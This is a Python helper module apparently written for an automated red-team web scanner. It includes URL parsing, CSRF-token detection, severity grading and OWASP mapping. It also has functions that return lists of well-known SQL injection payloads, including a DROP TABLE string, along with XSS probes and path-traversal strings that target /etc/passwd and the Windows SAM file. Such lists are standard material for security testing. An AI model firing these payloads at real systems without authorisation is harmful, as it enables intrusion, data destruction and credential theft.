"""Utility functions for red team agent."""

import re
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs


def extract_url_parameters(url: str) -> Dict[str, List[str]]:
    """
    Extract URL parameters from a URL.

    Args:
        url: URL string

    Returns:
        Dictionary of parameter names to values
    """
    parsed = urlparse(url)
    return parse_qs(parsed.query)


def is_api_endpoint(url: str) -> bool:
    """
    Check if URL is likely an API endpoint.

    Args:
        url: URL string

    Returns:
        True if URL appears to be an API endpoint
    """
    api_patterns = ["/api/", "/v1/", "/v2/", "/v3/", "/graphql", "/rest/", "/json/"]
    url_lower = url.lower()
    return any(pattern in url_lower for pattern in api_patterns)


def normalize_url(url: str) -> str:
    """
    Normalize a URL by removing fragments and sorting parameters.

    Args:
        url: URL string

    Returns:
        Normalized URL
    """
    parsed = urlparse(url)
    # Remove fragment
    normalized = parsed._replace(fragment="")
    return normalized.geturl()


def generate_sql_injection_payloads() -> List[str]:
    """
    Generate common SQL injection payloads.

    Returns:
        List of SQL injection payload strings
    """
    return [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin'--",
        "admin'/*",
        "' UNION SELECT NULL--",
        "1' OR '1'='1",
        "1' UNION SELECT NULL--",
        "'; DROP TABLE users--",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR '1'='1--",
        "1' AND '1'='1",
        "1' AND '1'='2",
    ]


def generate_xss_payloads() -> List[str]:
    """
    Generate common XSS payloads.

    Returns:
        List of XSS payload strings
    """
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "<div onmouseover=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
    ]


def generate_path_traversal_payloads() -> List[str]:
    """
    Generate common path traversal payloads.

    Returns:
        List of path traversal payload strings
    """
    return [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
    ]


def detect_csrf_token(html: str) -> bool:
    """
    Detect if CSRF token is present in HTML.

    Args:
        html: HTML content

    Returns:
        True if CSRF token is detected
    """
    csrf_patterns = [
        r'name=["\']csrf[_-]?token["\']',
        r'name=["\']_token["\']',
        r'name=["\']authenticity[_-]?token["\']',
        r'csrf[_-]?token',
        r'_token',
        r'X-CSRF-TOKEN',
        r'csrfmiddlewaretoken',
    ]

    html_lower = html.lower()
    return any(re.search(pattern, html_lower, re.IGNORECASE) for pattern in csrf_patterns)


def classify_severity(vulnerability_type: str) -> str:
    """
    Classify vulnerability severity based on type.

    Args:
        vulnerability_type: Type of vulnerability

    Returns:
        Severity level (Critical, High, Medium, Low)
    """
    critical_types = ["SQL Injection", "SQLi", "RCE", "Remote Code Execution", "Authentication Bypass"]
    high_types = ["XSS", "Cross-Site Scripting", "CSRF", "IDOR", "Sensitive Data Exposure"]
    medium_types = ["Information Disclosure", "Weak Authentication", "Session Management"]

    vuln_lower = vulnerability_type.lower()

    if any(ct.lower() in vuln_lower for ct in critical_types):
        return "Critical"
    elif any(ht.lower() in vuln_lower for ht in high_types):
        return "High"
    elif any(mt.lower() in vuln_lower for mt in medium_types):
        return "Medium"
    else:
        return "Low"


def get_owasp_category(vulnerability_type: str) -> str:
    """
    Map vulnerability type to OWASP Top 10 category.

    Args:
        vulnerability_type: Type of vulnerability

    Returns:
        OWASP Top 10 category
    """
    vuln_lower = vulnerability_type.lower()

    if "sql" in vuln_lower or "injection" in vuln_lower:
        return "A03:2021 – Injection"
    elif "xss" in vuln_lower or "cross-site scripting" in vuln_lower:
        return "A03:2021 – Injection"
    elif "csrf" in vuln_lower or "cross-site request forgery" in vuln_lower:
        return "A01:2021 – Broken Access Control"
    elif "idor" in vuln_lower or "insecure direct object reference" in vuln_lower:
        return "A01:2021 – Broken Access Control"
    elif "auth" in vuln_lower or "authentication" in vuln_lower:
        return "A07:2021 – Identification and Authentication Failures"
    elif "session" in vuln_lower:
        return "A07:2021 – Identification and Authentication Failures"
    elif "sensitive" in vuln_lower or "data exposure" in vuln_lower:
        return "A02:2021 – Cryptographic Failures"
    else:
        return "A05:2021 – Security Misconfiguration"
